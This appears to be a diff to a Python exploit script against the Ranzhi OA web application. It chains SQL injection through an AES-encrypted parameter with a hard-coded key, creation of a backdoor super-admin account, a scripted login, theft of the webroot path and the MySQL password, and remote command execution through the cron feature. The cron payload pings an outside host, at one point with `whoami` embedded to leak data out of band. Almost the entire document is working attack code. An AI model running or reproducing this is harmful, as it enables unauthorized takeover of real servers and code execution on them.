@@ -2,6 +2,7 @@
 from Crypto.Cipher import AES
 import json
 import requests
+import hashlib
 
 key='88888888888888888888888888888888'
 
@@ -42,21 +43,40 @@ def exp(ip_addr,sql=''):
     print r.text
 
 class Login_ranzhi():
+    def mymd5(self,src):
+        m1 = hashlib.md5()
+        m1.update(src)
+        return m1.hexdigest()
+
     def __init__(self,ip_addr):
         self.ip_addr=ip_addr
         self.url_login=ip_addr+'/sys/user-login.html'
+        #self.url_login=ip_addr+'sys/index.php?m=user&f=login'
+
         self.url_webroot=ip_addr+'/sys/package-upload.html'
+        #self.url_webroot = ip_addr + '/sys/index.php?m=package&f=upload'
+
         self.url_get_mysql_pass=ip_addr+'/sys/upgrade-backup.html'
+        #self.url_get_mysql_pass = ip_addr+'/sys/indx.php?m=upgrade&f=backup'
+
         self.url_cron=ipaddr+"/sys/cron-ajaxExec.html"
+        #self.url_cron = ipaddr + "/sys/index.php?m=cron&f=ajaxExec"
         self.webroot_path=''
+        self.random=''
 
         self.s=requests.session()
+    def get_login(self):
+        req=self.s.get(self.url_login)
+        random_count=req.content.find('v.random =')
+        self.random=req.content[random_count+12:random_count+44]
+
 
     def login(self):
+        password=self.mymd5(self.mymd5(self.mymd5('123456')+'hehe')+self.random)
         proxies = {"http": "http://10.22.6.244:8080"}
         login_data={
             'account':'hehe',
-            'password':'46b7fd252705a9ed18473c6cf6d65014',
+            'password':password,
             'referer':'123',
             'rawPassword':'e10adc3949ba59abbe56e057f20f883e',
             'keepLogin':'false'
@@ -92,18 +112,19 @@ class Login_ranzhi():
             print "getshell fail"
     def cron_getshell(self):
         exp(self.ip_addr,"sql=delete from sys_cron where id=1 or 1=1")
-        exp(self.ip_addr,"sql=INSERT INTO sys_cron(m,h,dom,mon,dow,command,remark,type)values('*','*','*','*','*','ping `whoami`.ceye.io','123','system')")
+        exp(self.ip_addr,"sql=INSERT INTO sys_cron(m,h,dom,mon,dow,command,remark,type)values('*','*','*','*','*','ping test.ceye.io','123','system')")
         eq_head = {'X-Requested-With': 'XMLHttpRequest'}
         self.s.headers=eq_head
         self.s.get(url=self.url_cron)
 
 if __name__ == '__main__':
-    ipaddr='http://demo.ranzhi.org/'
+    ipaddr='http://192.168.174.1:83/ranzhi/www/'
 
     exp_sql="sql=INSERT INTO sys_user(account,password,admin)values('hehe','46b7fd252705a9ed18473c6cf6d65014','super')"
     exp(ipaddr,exp_sql)
     rz=Login_ranzhi(ipaddr)
     print "login result:"
+    rz.get_login()
     rz.login()
     print "webroot path:"
     rz.get_webroot()
@@ -111,8 +132,7 @@ if __name__ == '__main__':
     rz.get_mysql_pass()
     print "start use exp getshell....."
     rz.mysql_getshell()
-    print "use cron getshell......."
+    print "use cron exec rce......."
     rz.cron_getshell()
-
 
 
